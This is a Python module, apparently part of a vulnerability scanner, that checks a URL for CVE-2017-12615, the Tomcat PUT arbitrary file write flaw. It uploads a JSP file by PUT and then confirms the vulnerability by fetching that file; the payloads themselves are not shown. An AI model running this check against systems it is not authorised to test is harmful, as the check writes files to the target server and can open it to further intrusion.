#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2017_12615_scan(self, url):
    ''' Tomcat PUT方法任意文件写入漏洞
            PUT方法可用, 上传未做过滤, 可以写入任意文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'File-Upload'
    vul_info['vul_id'] = 'CVE-2017-12615'
    vul_info['vul_method'] = 'PUT'
    vul_info['headers'] = {}

    headers = self.headers
    headers.update(vul_info['headers'])

    for payload in self.cve_2017_12615_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.put(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )

            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            verify_url = url + '{}.jsp'.format(self.random_num_1)
            verify_res = requests.get(
                    verify_url, 
                    timeout=self.timeout, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
            logger.logging(vul_info, verify_res.status_code, verify_res)

            if ((verify_res.status_code == 200) and (str(self.random_num_2) in verify_res.text)):
                results = {
                    'Target': url,
                    'Verify': verify_url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
